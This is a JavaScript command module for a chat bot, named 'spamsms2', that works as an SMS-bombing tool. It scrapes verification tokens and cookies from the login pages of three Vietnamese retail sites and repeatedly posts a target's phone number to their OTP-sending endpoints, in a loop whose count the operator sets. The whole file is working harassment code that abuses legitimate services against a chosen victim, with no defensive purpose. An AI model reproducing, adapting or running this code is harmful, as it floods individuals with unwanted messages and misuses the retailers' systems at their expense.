module.exports.config = {
  name: "spamsms2",
  version: "1.0.0",
  hasPermssion: 2,
  credits: "JudasisMe",
  description: "con cac",
  commandCategory: "Admin",
  usages: "[test]",
  cooldowns: 5
};
const axios = require('axios');
const cheerio = require('cheerio')
function bhx(number) {
const response2 = axios.get('https://www.bachhoaxanh.com/dang-nhap?callback=%2Flich-su-mua-hang', {
  headers: {
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Accept-Language': 'vi,en;q=0.9,en-US;q=0.8',
      'Cache-Control': 'max-age=0',
      'Connection': 'keep-alive',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Microsoft Edge";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"'
  }
}).then(res => {
  const $ = cheerio.load(res.data)
const token = $('section').find('div[class="form-otp active"]').find('input').attr('value')
  // get cookie
  var cookie = res.headers['set-cookie'];
  console.log(cookie.join('; '))
  // convert cookie to stirng
  var cookieString = cookie.join('; ');
  const data2 = new URLSearchParams({
      'phone': number,
       'objectId': token,
      'type': '4'
  });
  console.log(data2);
  const data3 = axios.post(
      'https://www.bachhoaxanh.com/aj/Customer/SendOTP',
      data2,
      {
          headers: {
              'Accept': '*/*',
              'Accept-Language': 'vi,en;q=0.9,en-US;q=0.8',
              'Connection': 'keep-alive',
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'Cookie': cookieString,
              'Origin': 'https://www.bachhoaxanh.com/',
              'Referer': 'https://www.bachhoaxanh.com/dang-nhap?callback=%2Flich-su-mua-hang',
              'Sec-Fetch-Dest': 'empty',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Site': 'same-origin',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47',
              'X-Requested-With': 'XMLHttpRequest',
              'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Microsoft Edge";v="104"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '"Windows"'
          }
      }
  ).then(res => {
      console.log(res.data);
  });
})

}
function tgdd(number) {
const response2 = axios.get('https://www.thegioididong.com/lich-su-mua-hang/dang-nhap', {
  headers: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Accept-Language': 'vi,en;q=0.9,en-US;q=0.8',
      'Cache-Control': 'max-age=0',
      'Connection': 'keep-alive',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Microsoft Edge";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"'
  }
}).then(res => {
  var token = res.data.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0];
  // get cookie
  var cookie = res.headers['set-cookie'];
  // convert cookie to stirng
  var cookieString = cookie.join('; ');
  const data2 = new URLSearchParams({
      'phoneNumber': number,
      'isReSend': 'false',
      '__RequestVerificationToken': token
  });
  console.log(data2);
  // axios post
  const data3 = axios.post(
      'https://www.thegioididong.com/lich-su-mua-hang/Login/GetVerifyCode',
      data2,
      {
          headers: {
              'Accept': '*/*',
              'Accept-Language': 'vi,en;q=0.9,en-US;q=0.8',
              'Connection': 'keep-alive',
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'Cookie': cookie,
              'Origin': 'https://www.thegioididong.com',
              'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
              'Sec-Fetch-Dest': 'empty',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Site': 'same-origin',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47',
              'X-Requested-With': 'XMLHttpRequest',
              'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Microsoft Edge";v="104"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '"Windows"'
          }
      }
  ).then(res => {
      console.log(res.data);
  });
})

}
function dmx(number) {
const response2 = axios.get('https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap', {
  headers: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Accept-Language': 'vi,en;q=0.9,en-US;q=0.8',
      'Cache-Control': 'max-age=0',
      'Connection': 'keep-alive',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Microsoft Edge";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"'
  }
}).then(res => {
  var token = res.data.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0];
  // get cookie
  var cookie = res.headers['set-cookie'];
  // convert cookie to stirng
  var cookieString = cookie.join('; ');
  const data2 = new URLSearchParams({
      'phoneNumber': number,
      'isReSend': 'false',
      '__RequestVerificationToken': token
  });
  console.log(data2);
  // axios post
  const data3 = axios.post(
      'https://www.dienmayxanh.com/lich-su-mua-hang/Login/GetVerifyCode',
      data2,
      {
          headers: {
              'Accept': '*/*',
              'Accept-Language': 'vi,en;q=0.9,en-US;q=0.8',
              'Connection': 'keep-alive',
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'Cookie': cookie,
              'Origin': 'https://www.dienmayxanh.com',
              'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
              'Sec-Fetch-Dest': 'empty',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Site': 'same-origin',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47',
              'X-Requested-With': 'XMLHttpRequest',
              'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Microsoft Edge";v="104"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '"Windows"'
          }
      }
  ).then(res => {
      console.log(res.data);
  });
})

}
module.exports.run = async function ({ event, api, Currencies, args ,Users }) {
if(!args[0] || !args[1] || !args[2]) return api.sendMessage('thieu du lieu thuc thi', event.threadID)
api.sendMessage('dang tien hanh spam', event.threadID)
for(let i = 0; i < args[0]; i++){
 if(args[2] == 'bhx'){
   bhx(args[1])
 } else if(args[2] == 'tgdd'){
   tgdd(args[1])
 } else if(args[2] == 'dmx'){
   dmx(args[1])
 }
 await new Promise(resolve => setTimeout(resolve, 10 * 1000))
}
    }